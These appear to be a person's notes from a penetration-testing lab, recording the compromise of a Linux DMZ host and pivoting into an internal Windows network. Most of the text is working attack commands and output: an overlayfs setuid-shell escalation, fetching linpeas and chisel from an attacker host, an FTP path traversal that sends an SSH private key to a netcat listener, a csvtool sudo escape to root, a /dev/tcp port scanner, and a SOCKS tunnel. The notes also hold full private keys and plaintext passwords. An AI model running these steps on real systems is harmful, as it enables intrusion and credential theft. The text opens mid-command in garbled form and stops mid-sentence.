rkdir=w m && cp /bin/bash m/bash_root && chmod u+s m/bash_root && ./m/bash_root -p"eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,wor
bash_root: /root/.bashrc: Permission denied
root@WEB-DMZ01:/tmp/m# whoami
whoami
root
root@WEB-DMZ01:/tmp/m# cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
root@WEB-DMZ01:/tmp/m# id
id
uid=0(root) gid=0(root) groups=0(root)
root@WEB-DMZ01:/tmp/m# cd /home/srvadm
cd /home/srvadm
bash_root: cd: /home/srvadm: Permission denied
root@WEB-DMZ01:/tmp/m# ls
ls
l  m  u  w
root@WEB-DMZ01:/tmp/m# ls -l /tmp/u/bash_root
ls -l /tmp/u/bash_root
-rwsr-xr-x 1 root root 1183448 Jan 21 06:20 /tmp/u/bash_root
```

```bash
websvc@WEB-DMZ01:/tmp$ wget 10.10.16.63/linpeas.sh
--2026-01-21 15:03:02--  http://10.10.16.63/linpeas.sh
Connecting to 10.10.16.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 952.58K   642KB/s    in 1.5s    

2026-01-21 15:03:04 (642 KB/s) - 'linpeas.sh' saved [975444/975444]
```

![[Pasted image 20260121120327.png]]

![[Pasted image 20260121120602.png]]

```bash
websvc@WEB-DMZ01:/tmp/pkwner$ cat /var/lib/fwupd/pki/secret.key
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
```bash
websvc@WEB-DMZ01:/$ hostname -I
10.129.5.216 172.16.139.10 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb0:bfa 
 from" &) ;done1:/$ for i in {1..254} ;do (ping -c 1 172.16.139.$i | grep "bytes 
64 bytes from 172.16.139.3: icmp_seq=1 ttl=128 time=3.07 ms
64 bytes from 172.16.139.10: icmp_seq=1 ttl=64 time=0.092 ms
64 bytes from 172.16.139.35: icmp_seq=1 ttl=128 time=4.36 ms
```

![[Pasted image 20260122125356.png]]

```bash
websvc@WEB-DMZ01:~$ nc localhost 2121
220 uftpd (2.8) ready.
USER anonymous
230 Guest login OK, access restrictions apply.
PASS hi
230 Guest login OK, access restrictions apply.
PORT 127,0,0,1,1,1002
200 PORT command successful.
RETR ../../../home/srvadm/.ssh/id_rsa
150 Data connection opened; transfer starting.
226 Transfer complete.
```

```bash
websvc@WEB-DMZ01:/opt$ nc -nlvp 1258
Listening on 0.0.0.0 1258
Connection received on 127.0.0.1 44198
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
ssh srvadm@10.129.5.216 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 22 Jan 2026 03:55:00 PM UTC

  System load:                      0.18
  Usage of /:                       57.8% of 21.57GB
  Memory usage:                     92%
  Swap usage:                       0%
  Processes:                        443
  Users logged in:                  1
  IPv4 address for br-882b86d7632c: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.5.216
  IPv6 address for ens160:          dead:beef::250:56ff:feb0:bfa
  IPv4 address for ens192:          172.16.139.10


271 updates can be applied immediately.
209 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb 18 19:13:42 2025 from 10.10.14.100
$ bash
srvadm@WEB-DMZ01:~$ cat flag.txt 
42ef58c3aa50d950e4de7afeba5f764a
```

```bash
websvc@WEB-DMZ01:~$ netstat -tulpn 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8002          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8003          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8004          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8101          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8006          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8007          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8008          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:2121            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:61616         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8980          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.18.0.1:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41813         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.16.139.10:53        0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.129.5.216:53         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::993                  :::*                    LISTEN      -                   
tcp6       0      0 :::995                  :::*                    LISTEN      -                   
tcp6       0      0 :::2121                 :::*                    LISTEN      -                   
tcp6       0      0 :::110                  :::*                    LISTEN      -                   
tcp6       0      0 :::143                  :::*                    LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 fe80::dc72:34ff:fe64:53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::e4f0:7cff:fe19:53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::42:b8ff:feaa:f:53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::250:56ff:feb0::53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::250:56ff:feb0::53 :::*                    LISTEN      -                   
tcp6       0      0 ::1:53                  :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:953                 :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::4444                 :::*  
```

![[Pasted image 20260122142127.png]]


https://aaronesau.com/blog/post/6

![[Pasted image 20260122144426.png]]

```bash
nc localhost 2121
220 uftpd (2.8) ready.
USER anonymous
230 Guest login OK, access restrictions apply.
PASS hi
230 Guest login OK, access restrictions apply.
PORT 127,0,0,1,1,1002
200 PORT command successful.
RETR ../../../home/srvadm/.ssh/id_rsa
150 Data connection opened; transfer starting.
226 Transfer complete.
```


```bash
websvc@WEB-DMZ01:/opt$ nc -nlvp 1258
Listening on 0.0.0.0 1258
Connection received on 127.0.0.1 44198
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![[Pasted image 20260122144444.png]]

![[Pasted image 20260122125538.png]]

```bash
srvadm@WEB-DMZ01:~$ sudo -l
Matching Defaults entries for srvadm on WEB-DMZ01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on WEB-DMZ01:
    (ALL) NOPASSWD: /usr/bin/csvtool
```

https://gtfobins.org/gtfobins/csvtool/#shell

![[Pasted image 20260122130013.png]]

```bash
srvadm@WEB-DMZ01:~$ sudo /usr/bin/csvtool call '/bin/sh;false' /etc/hosts
# whoami
root
```

```bash
root@WEB-DMZ01:~# cat flag.txt
1f99751e8c37dfd03ca249f97b2b588c
```

![[Pasted image 20260122125959.png]]

```bash
#!/bin/bash
ips=(172.16.139.3 172.16.139.10 172.16.139.35)
for ip in "${ips[@]}"; do
  echo "Escaneando $ip..."
  for i in $(seq 1 10000); do
      timeout 1 bash -c "echo '' > /dev/tcp/$ip/$i" 2>/dev/null && echo "\t[+] Puerto Abierto $i" &
  done; wait 
done
```

```bash
Escaneando 172.16.139.3...
[+] Puerto Abierto 53
[+] Puerto Abierto 88
[+] Puerto Abierto 135
[+] Puerto Abierto 139
[+] Puerto Abierto 389
[+] Puerto Abierto 445
[+] Puerto Abierto 464
[+] Puerto Abierto 593
[+] Puerto Abierto 636
[+] Puerto Abierto 3269
[+] Puerto Abierto 3268
[+] Puerto Abierto 5985
[+] Puerto Abierto 9389




Escaneando 172.16.139.10...
[+] Puerto Abierto 21
[+] Puerto Abierto 25
[+] Puerto Abierto 22
[+] Puerto Abierto 53
[+] Puerto Abierto 80
[+] Puerto Abierto 111
[+] Puerto Abierto 110
[+] Puerto Abierto 143
[+] Puerto Abierto 993
[+] Puerto Abierto 995
[+] Puerto Abierto 2121




Escaneando 172.16.139.35...
[+] Puerto Abierto 111
[+] Puerto Abierto 135
[+] Puerto Abierto 139
[+] Puerto Abierto 445
[+] Puerto Abierto 2049
[+] Puerto Abierto 3389
[+] Puerto Abierto 5985
[+] Puerto Abierto 8080
```

```bash
websvc@WEB-DMZ01:/tmp$ showmount -e 172.16.139.35
Export list for 172.16.139.35:
/SRV01 (everyone)
```

```bash
root@WEB-DMZ01:/tmp# wget 10.10.16.63/chisel
--2026-01-21 16:21:53--  http://10.10.16.63/chisel
Connecting to 10.10.16.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7102464 (6.8M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                       100%[==============================================================================================>]   6.77M  1.23MB/s    in 8.7s    

2026-01-21 16:22:03 (796 KB/s) - ‘chisel’ saved [7102464/7102464]

root@WEB-DMZ01:/tmp# chmod +X chisel 
root@WEB-DMZ01:/tmp# chmod +x chisel 
root@WEB-DMZ01:/tmp# ./chisel client:10.10.16.63 R:socks

  Usage: chisel [command] [--help]

  Version: 1.7.6 (go1.16rc1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

root@WEB-DMZ01:/tmp# ./chisel client 10.10.16.63:5555 R:socks
2026/01/21 16:23:19 client: Connecting to ws://10.10.16.63:5555
2026/01/21 16:23:23 client: Connected (Latency 187.171595ms)
```

```bash
cat tomcat-users.xml 
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="admin" roles="manager-gui"/>  
<user username="robot" password="Sup3RAdm1n123@Adm1n" roles="manager-script"/>

</tomcat-users>
```

```bash
┌──(root㉿kali)-[/home/…/srv01/apps/liferay/liferay-setup-script]
└─# cat setup.py           
import logging
import subprocess
import configparser
import argparse
import sys
import pathlib


DEFAULT_LOG_LEVEL = 'INFO'
PROPERTIES_FILENAME = 'portal-ext.properties'
BLADE_MIN_VERSION = (4, 0, 9)

PLACEHOLDER_SECTION_NAME = 'placeholder'
WIZ_ENV = 'wiz'
WIZ_PROPERTIES = '''include-and-override=portal-developer.properties

admin.email.from.address=test@liferay.com
admin.email.from.name=Test Test
company.default.locale=en_US
company.default.time.zone=UTC
company.default.web.id=liferay.com
default.admin.email.address.prefix=test

jdbc.default.driverClassName=org.postgresql.Driver
jdbc.default.password=@WSXcde3$RFVbgt%
jdbc.default.url=jdbc:postgresql://localhost:5432/lportal
jdbc.default.username=admin
```

![[Pasted image 20260121154657.png]]

![[Pasted image 20260121154819.png]]

![[Pasted image 20260121160202.png]]

![[Pasted image 20260121160430.png]]

![[Pasted image 20260121170633.png]]

```bash
 Volume Serial Number is DF59-CC7D

 Directory of C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tomcat-9.0.56

09/21/2022  02:49 PM    <DIR>          .
09/21/2022  02:49 PM    <DIR>          ..
09/21/2022  02:49 PM                40 .githash
01/21/2026  03:39 PM    <DIR>          bin
12/02/2021  06:30 PM            19,528 BUILDING.txt
09/21/2022  02:49 PM    <DIR>          conf
12/02/2021  06:30 PM             6,375 CONTRIBUTING.md
09/21/2022  02:49 PM    <DIR>          lib
12/02/2021  06:30 PM            58,153 LICENSE
01/20/2026  05:48 PM    <DIR>          logs
12/02/2021  06:30 PM             2,401 NOTICE
12/02/2021  06:30 PM             3,459 README.md
12/02/2021  06:30 PM             7,072 RELEASE-NOTES
12/02/2021  06:30 PM            16,984 RUNNING.txt
01/21/2026  07:16 PM    <DIR>          temp
09/21/2022  02:49 PM    <DIR>          webapps
09/21/2022  02:49 PM    <DIR>          work
```

```bash
Directory of C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tomcat-9.0.56\conf

09/21/2022  02:49 PM    <DIR>          .
09/21/2022  02:49 PM    <DIR>          ..
09/21/2022  02:49 PM    <DIR>          Catalina
12/02/2021  06:30 PM            13,216 catalina.policy
09/21/2022  02:27 PM             7,656 catalina.properties
12/02/2021  06:30 PM             1,431 context.xml
12/02/2021  06:30 PM             1,172 jaspic-providers.xml
12/02/2021  06:30 PM             2,365 jaspic-providers.xsd
09/21/2022  02:27 PM             4,427 logging.properties
09/21/2022  02:27 PM             7,934 server.xml
12/02/2021  06:30 PM             2,812 tomcat-users.xml
12/02/2021  06:30 PM             2,617 tomcat-users.xsd
09/21/2022  02:27 PM           177,121 web.xml
```

```bash
Output

User accounts for \\SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
rhinkle                  svc_liferay              WDAGUtilityAccount  
```

![[Pasted image 20260121220507.png]]

```bash
hice esto:
